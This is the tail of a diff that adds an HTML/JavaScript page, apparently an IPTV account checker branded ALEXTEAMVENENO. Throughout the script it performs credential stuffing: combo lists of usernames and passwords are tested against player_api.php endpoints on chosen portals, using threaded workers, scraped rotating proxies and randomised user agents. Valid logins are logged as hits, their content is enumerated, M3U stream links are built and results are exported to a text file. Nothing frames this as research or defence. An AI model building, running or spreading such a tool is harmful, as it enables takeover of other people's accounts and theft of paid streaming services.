+            const el = document.getElementById('console');
+            const line = document.createElement('div');
+            line.className = `log-${type}`;
+            line.textContent = `[${new Date().toLocaleTimeString('en-US',{hour12:false})}] ${type==='hit'?'[HIT]':type==='err'?'[ERR]':'[LOG]'} ${msg}`;
+            el.appendChild(line);
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function showToast(msg, d = 2500) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', d);
+        }
+
+        function updateStats() {
+            const elapsed = (Date.now() - state.startTime) / 1000;
+            const checked = state.stats.checked;
+            const speed = elapsed > 0 ? (checked / elapsed) : 0;
+            const cpm = Math.floor(speed * 60);
+            const rate = checked > 0 ? ((state.stats.hits / checked) * 100).toFixed(2) : '0.00';
+            const remaining = state.totalCombos - checked;
+            const eta = speed > 0 ? remaining / speed : 0;
+            const m = Math.floor(eta / 60), s = Math.floor(eta % 60);
+            document.getElementById('statChecked').textContent = checked;
+            document.getElementById('statHits').textContent = state.stats.hits;
+            document.getElementById('statErrors').textContent = state.stats.errors;
+            document.getElementById('statCPM').textContent = cpm;
+            document.getElementById('statRate').textContent = `${rate}%`;
+            document.getElementById('statETA').textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            document.getElementById('statChannels').textContent = state.totalChannels;
+            document.getElementById('statSpain').textContent = state.totalSpain;
+            const pct = state.totalCombos > 0 ? (checked / state.totalCombos * 100) : 0;
+            document.getElementById('progressFill').style.width = `${pct}%`;
+            document.getElementById('progressText').textContent = `[ ${checked} / ${state.totalCombos} ] ${pct.toFixed(1)}%`;
+        }
+
+        // ==================== MODAL ====================
+        function showModal(hitData) {
+            state.currentModalHit = hitData;
+            const expClass = hitData.exp !== 'N/A' && new Date(hitData.exp) < new Date() ? ' style="color:var(--neon-red);"' : '';
+            document.getElementById('modalHitInfo').innerHTML = `
+                <div class="hit-info-item"><div class="hit-info-label">👤 USER</div><div class="hit-info-value">${hitData.user}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🔑 PASS</div><div class="hit-info-value">${hitData.pass}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🌐 PANEL</div><div class="hit-info-value">${hitData.portal}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🟢 STATUS</div><div class="hit-info-value">${hitData.status||'Active'}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">📅 EXPIRES</div><div class="hit-info-value"${expClass}>${hitData.exp||'N/A'}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🛡️ PROXY</div><div class="hit-info-value">${hitData.proxy||'Direct'}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">📺 CHANNELS</div><div class="hit-info-value">${hitData.canales||0}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🇪🇸 SPAIN</div><div class="hit-info-value" style="color:var(--neon-orange);">${hitData.espana||0}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🎬 MOVIES</div><div class="hit-info-value">${hitData.pelis||0}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🍿 SERIES</div><div class="hit-info-value">${hitData.series||0}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">📂 CATS</div><div class="hit-info-value">${hitData.categories?hitData.categories.length:0}</div></div>
+                <div class="hit-info-item"><div class="hit-info-label">🔌 CONN</div><div class="hit-info-value">${hitData.actConn||'N/A'}/${hitData.maxConn||'N/A'}</div></div>
+            `;
+            const catSec = document.getElementById('modalCategories');
+            if (hitData.categories && hitData.categories.length > 0) {
+                catSec.style.display = 'block';
+                document.getElementById('modalCategoriesGrid').innerHTML = hitData.categories.map(c => `<div class="category-tag">🧪 ${c}</div>`).join('');
+            } else catSec.style.display = 'none';
+            document.getElementById('m3uModalLink').textContent = hitData.m3u || 'N/A';
+            document.getElementById('m3uModal').style.display = 'flex';
+        }
+
+        function closeM3uModal(e) { if (e.target === document.getElementById('m3uModal')) document.getElementById('m3uModal').style.display = 'none'; }
+        function closeM3uModalDirect() { document.getElementById('m3uModal').style.display = 'none'; }
+
+        function copyM3uFromModal() {
+            copyToClipboard(document.getElementById('m3uModalLink').textContent);
+            showToast('✅ M3U copiado!');
+        }
+
+        function copyAllDetails() {
+            const h = state.currentModalHit;
+            if (!h) return;
+            let txt = `☢️ ALEXTEAMVENENO · HIT REPORT\n`;
+            txt += `━━━━━━━━━━━━━━━━━━━━\n👤 ${h.user}\n🔑 ${h.pass}\n🌐 ${h.portal}\n🟢 ${h.status||'Active'}\n📅 ${h.exp||'N/A'}\n🛡️ ${h.proxy||'Direct'}\n`;
+            txt += `━━━━━━━━━━━━━━━━━━━━\n📺 ${h.canales||0} | 🇪🇸 ${h.espana||0} | 🎬 ${h.pelis||0} | 🍿 ${h.series||0}\n`;
+            if (h.categories && h.categories.length > 0) {
+                txt += `━━━━━━━━━━━━━━━━━━━━\n📂 Categories (${h.categories.length}):\n${h.categories.slice(0,30).map(c=>'  🧪 '+c).join('\n')}${h.categories.length>30?'\n  ... +'+(h.categories.length-30)+' more':''}\n`;
+            }
+            txt += `━━━━━━━━━━━━━━━━━━━━\n🔗 M3U:\n${h.m3u}\n━━━━━━━━━━━━━━━━━━━━\n[ ALEXTEAMVENENO ]`;
+            copyToClipboard(txt);
+            showToast('✅ Todo copiado!');
+        }
+
+        function copyToClipboard(text) {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(() => showToast('✅ Copiado!')).catch(() => fallbackCopy(text));
+            } else fallbackCopy(text);
+        }
+
+        function fallbackCopy(text) {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0;';
+            document.body.appendChild(ta);
+            ta.focus();
+            ta.select();
+            try { document.execCommand('copy');
+                showToast('✅ Copiado!'); } catch (e) { showToast('❌ Error al copiar'); }
+            document.body.removeChild(ta);
+        }
+
+        // ==================== GUARDAR HITS TXT ====================
+        function saveHitsToTxt() {
+            if (state.hits.length === 0) {
+                showToast('⚠️ No hay hits para guardar');
+                return;
+            }
+            let content = `☢️ ALEXTEAMVENENO · HIT DATABASE\n`;
+            content += `📅 ${new Date().toISOString().split('T')[0]} | Total: ${state.hits.length} hits\n`;
+            content += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+            state.hits.forEach((h, i) => {
+                content += `#${i+1} ━━━━━━━━━━━━━━━━━━━━\n`;
+                content += `👤 User: ${h.user}\n`;
+                content += `🔑 Pass: ${h.pass}\n`;
+                content += `🌐 Panel: ${h.portal}\n`;
+                content += `🟢 Status: ${h.status||'Active'}\n`;
+                content += `📅 Expires: ${h.exp||'N/A'}\n`;
+                content += `📺 Channels: ${h.canales||0} | 🇪🇸 Spain: ${h.espana||0}\n`;
+                content += `🎬 Movies: ${h.pelis||0} | 🍿 Series: ${h.series||0}\n`;
+                if (h.categories && h.categories.length > 0) {
+                    content += `📂 Categories (${h.categories.length}): ${h.categories.slice(0,20).join(', ')}${h.categories.length>20?'...':''}\n`;
+                }
+                content += `🔗 M3U: ${h.m3u}\n\n`;
+            });
+            content += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[ ALEXTEAMVENENO ]`;
+
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `ALEXTEAMVENENO_HITS_${new Date().toISOString().split('T')[0]}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`💾 ${state.hits.length} hits guardados!`);
+        }
+
+        function clearHits() {
+            state.hits = [];
+            state.totalChannels = 0;
+            state.totalSpain = 0;
+            document.getElementById('hitsBody').innerHTML = '';
+            updateStats();
+            log('🗑️ Hits limpiados', 'warn');
+            showToast('🗑️ Hits limpiados');
+        }
+
+        // ==================== TABLA ====================
+        function addHitToTable(hitData) {
+            state.hits.push(hitData);
+            state.totalChannels += hitData.canales || 0;
+            state.totalSpain += hitData.espana || 0;
+
+            const tbody = document.getElementById('hitsBody');
+            const row = tbody.insertRow(0);
+            row.onclick = () => showModal(hitData);
+
+            row.innerHTML = `
+                <td class="col-user" title="${hitData.user}">${hitData.user}</td>
+                <td class="col-pass" title="${hitData.pass}">${hitData.pass}</td>
+                <td class="col-status">${hitData.status||'Active'}</td>
+                <td class="col-exp">${hitData.exp||'N/A'}</td>
+                <td class="col-panel" title="${hitData.portal}">${hitData.portal}</td>
+                <td class="col-ch">${hitData.canales||0}</td>
+                <td class="col-es">${hitData.espana||0}</td>
+                <td class="col-movies">${hitData.pelis||0}</td>
+                <td class="col-series">${hitData.series||0}</td>
+                <td>${hitData.categories&&hitData.categories.length>0?`<span class="cat-badge" onclick="event.stopPropagation();showModal(state.hits[0])">${hitData.categories.length} 🏷️</span>`:'0'}</td>
+                <td class="col-m3u">
+                    <div class="m3u-cell">
+                        <span class="m3u-link-text" onclick="event.stopPropagation();copyToClipboard('${hitData.m3u?.replace(/'/g,"\\'")||''}')" title="Toca para copiar">${hitData.m3u||'N/A'}</span>
+                        <button class="btn-copy-m3u" onclick="event.stopPropagation();copyToClipboard('${hitData.m3u?.replace(/'/g,"\\'")||''}')" title="Copiar M3U">📋</button>
+                    </div>
+                </td>
+            `;
+        }
+
+        // ==================== ARCHIVOS ====================
+        function handleComboFile(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                state.comboLines = e.target.result.split('\n').map(l=>l.trim()).filter(l=>l.includes(':'));
+                state.totalCombos = state.comboLines.length;
+                state.stats = { checked:0, hits:0, errors:0 };
+                state.hits = [];
+                state.totalChannels = 0;
+                state.totalSpain = 0;
+                document.getElementById('hitsBody').innerHTML = '';
+                document.getElementById('comboStatus').textContent = `${state.totalCombos} lines`;
+                log(`✅ ${state.totalCombos} combos loaded [ALEXTEAMVENENO]`, 'info');
+                updateStats();
+                document.getElementById('progressFill').style.width = '0%';
+            };
+            reader.readAsText(file);
+        }
+
+        function handleProxyFile(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const lines = e.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('#'));
+                const pt = parseInt(document.getElementById('proxyType').value);
+                state.proxies = [];
+                for (const line of lines) {
+                    let px = line;
+                    if (!line.match(/^(https?|socks[45]h?):\/\//)) {
+                        const p = line.split(':');
+                        const prem = p.length===4;
+                        switch(pt) {
+                            case 0: px = prem?`socks5h://${p[2]}:${p[3]}@${p[0]}:${p[1]}`:`http://${line}`; break;
+                            case 1: px = prem?`http://${p[2]}:${p[3]}@${p[0]}:${p[1]}`:`http://${line}`; break;
+                            case 2: px = prem?`socks4://${p[2]}:${p[3]}@${p[0]}:${p[1]}`:`socks4://${line}`; break;
+                            case 3: px = prem?`socks5h://${p[2]}:${p[3]}@${p[0]}:${p[1]}`:`socks5h://${line}`; break;
+                        }
+                    }
+                    state.proxies.push(px);
+                }
+                document.getElementById('proxyStatus').textContent = `> ${state.proxies.length} proxies`;
+                log(`🌐 ${state.proxies.length} proxies loaded`, 'info');
+            };
+            reader.readAsText(file);
+        }
+
+        async function scrapeProxies() {
+            const btn = document.getElementById('btnScrape');
+            btn.disabled = true;
+            btn.textContent = '⏳...';
+            log('📥 Scraping TheSpeedX...', 'info');
+            const sources = [
+                {url:'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',t:'http'},
+                {url:'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',t:'socks4'},
+                {url:'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',t:'socks5'}
+            ];
+            const all = [];
+            for (const s of sources) {
+                try {
+                    const r = await fetch(s.url);
+                    const t = await r.text();
+                    (t.match(/\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b/g)||[]).forEach(m=>{const[i,p]=m.split(':');all.push({ip:i,port:p,type:s.t});});
+                } catch(e) {}
+            }
+            const test = all.slice(0,200);
+            const working = [];
+            for (let i=0; i<test.length; i+=20) {
+                await Promise.all(test.slice(i,i+20).map(async p=>{
+                    try {
+                        const c = new AbortController();
+                        setTimeout(()=>c.abort(),3000);
+                        const r = await fetch('https://httpbin.org/ip',{signal:c.signal});
+                        if(r.ok) working.push(`${p.type}://${p.ip}:${p.port}`);
+                    } catch(e) {}
+                }));
+            }
+            state.proxies = working;
+            document.getElementById('proxyStatus').textContent = `> ${working.length} proxies`;
+            log(`✅ ${working.length} proxies [ALEXTEAMVENENO]`, 'hit');
+            btn.disabled = false;
+            btn.textContent = '🌐 SCRAPE';
+        }
+
+        // ==================== ESCANEO ====================
+        async function checkCombo(line, portals, https, proxy) {
+            const [user, pass] = line.split(':',2);
+            if(!user||!pass) return null;
+            const proto = https?'https':'http';
+            for (const portal of portals) {
+                if(!state.isRunning) return null;
+                const cp = portal.replace(/^https?:\/\//,'').replace(/\/$/,'');
+                const base = `${proto}://${cp}`;
+                let retries = 3;
+                while(retries>0 && state.isRunning) {
+                    try {
+                        const c = new AbortController();
+                        setTimeout(()=>c.abort(),12000);
+                        const r = await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,{signal:c.signal,headers:{'User-Agent':getRandomUA()}});
+                        if(r.status===200) {
+                            const txt = await r.text();
+                            if(txt.includes('active')||txt.includes('exp_date')) {
+                                let d={}; try{d=JSON.parse(txt);}catch(e){}
+                                const ui = d.user_info||{};
+                                const exp = ui.exp_date?new Date(parseInt(ui.exp_date)*1000).toISOString().split('T')[0]:'N/A';
+                                let cats=[], can=0, esp=0, pel=0, ser=0;
+                                try{const cr=await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`,{signal:AbortSignal.timeout(8000),headers:{'User-Agent':getRandomUA()}});if(cr.ok){const cd=await cr.json();if(Array.isArray(cd))cats=cd.map(c=>c.category_name||'Sin nombre');}}catch(e){}
+                                try{const lr=await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_streams`,{signal:AbortSignal.timeout(10000),headers:{'User-Agent':getRandomUA()}});if(lr.ok){const ld=await lr.json();if(Array.isArray(ld)){can=ld.length;esp=ld.filter(c=>{const n=(c.name||'').toLowerCase(),ct=(c.category_name||'').toLowerCase();return n.includes('es ')||n.includes('espa')||ct.includes('es ')||ct.includes('espa');}).length;}}}catch(e){}
+                                try{const vr=await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_vod_streams`,{signal:AbortSignal.timeout(10000),headers:{'User-Agent':getRandomUA()}});if(vr.ok){const vd=await vr.json();if(Array.isArray(vd))pel=vd.length;}}catch(e){}
+                                try{const sr=await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_series`,{signal:AbortSignal.timeout(10000),headers:{'User-Agent':getRandomUA()}});if(sr.ok){const sd=await sr.json();if(Array.isArray(sd))ser=sd.length;}}catch(e){}
+                                if(can===0&&pel===0&&ser===0) return {error:true,noContent:true};
+                                const m3u = `${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+                                let ptype='Direct';
+                                if(proxy){if(proxy.includes('socks5'))ptype='SOCKS5';else if(proxy.includes('socks4'))ptype='SOCKS4';else if(proxy.includes('http'))ptype='HTTP';}
+                                return {hit:true, data:{user,pass,exp,status:ui.status||'Active',maxConn:ui.max_connections,actConn:ui.active_cons,portal:cp,m3u,canales:can,espana:esp,pelis:pel,series:ser,categories:cats,proxy:ptype}};
+                            }
+                            break;
+                        } else if([403,401,429,500,502,503,504].includes(r.status)){retries--;continue;} else break;
+                    } catch(e){if(e.name==='AbortError'){retries--;continue;}retries--;if(retries<=0)return{error:true};}
+                }
+            }
+            return {invalid:true};
+        }
+
+        async function startScan() {
+            if(state.isRunning) return;
+            if(!state.comboLines.length){showToast('⚠️ Carga un combo');return;}
+            const raw = document.getElementById('portals').value.trim();
+            if(!raw){showToast('⚠️ Ingresa URLs');return;}
+            const portals = raw.split(',').map(p=>p.trim()).filter(Boolean);
+            const threads = parseInt(document.getElementById('threads').value)||20;
+            const https = document.getElementById('useHttps').checked;
+            const useProxy = document.getElementById('useProxies').checked && state.proxies.length>0;
+
+            state.isRunning = true;
+            state.stats = {checked:0,hits:0,errors:0};
+            state.hits = [];
+            state.totalChannels = 0;
+            state.totalSpain = 0;
+            state.startTime = Date.now();
+            state.proxyIndex = 0;
+            document.getElementById('btnStart').disabled = true;
+            document.getElementById('btnStop').disabled = false;
+            document.getElementById('hitsBody').innerHTML = '';
+
+            log('🚀 ATTACK DEPLOYED [ALEXTEAMVENENO]', 'warn');
+
+            const queue = [...state.comboLines];
+            let qi = 0;
+            const worker = async () => {
+                while(state.isRunning && qi < queue.length) {
+                    const line = queue[qi++];
+                    if(!line) continue;
+                    const proxy = useProxy ? getNextProxy() : null;
+                    const res = await checkCombo(line, portals, https, proxy);
+                    state.stats.checked++;
+                    if(res?.hit) {
+                        state.stats.hits++;
+                        log(`💥 HIT! ${res.data.user} @ ${res.data.portal} | 📺 ${res.data.canales} (🇪🇸 ${res.data.espana}) | 📂 ${res.data.categories.length} cats`, 'hit');
+                        addHitToTable(res.data);
+                    } else if(res?.error) state.stats.errors++;
+                    if(state.stats.checked%10===0 || res?.hit) updateStats();
+                }
+            };
+            const wc = Math.min(threads, queue.length);
+            await Promise.all(Array(wc).fill().map(()=>worker()));
+
+            state.isRunning = false;
+            document.getElementById('btnStart').disabled = false;
+            document.getElementById('btnStop').disabled = true;
+            updateStats();
+            log(`🎯 FIN. Hits: ${state.stats.hits} | 📺 ${state.totalChannels} | 🇪🇸 ${state.totalSpain} [ALEXTEAMVENENO]`, 'warn');
+            showToast(`✅ ${state.stats.hits} hits!`);
+        }
+
+        function stopScan() {
+            state.isRunning = false;
+            log('⬛ ABORT [ALEXTEAMVENENO]', 'warn');
+            document.getElementById('btnStop').disabled = true;
+        }
+
+        // ==================== INIT ====================
+        updateStats();
+        log('☢️ ALEXTEAMVENENO · CYBERPUNK NEON v14.0', 'warn');
+        log('> Sistema listo. Carga combo para iniciar.', 'info');
+    </script>
+</body>
+</html>
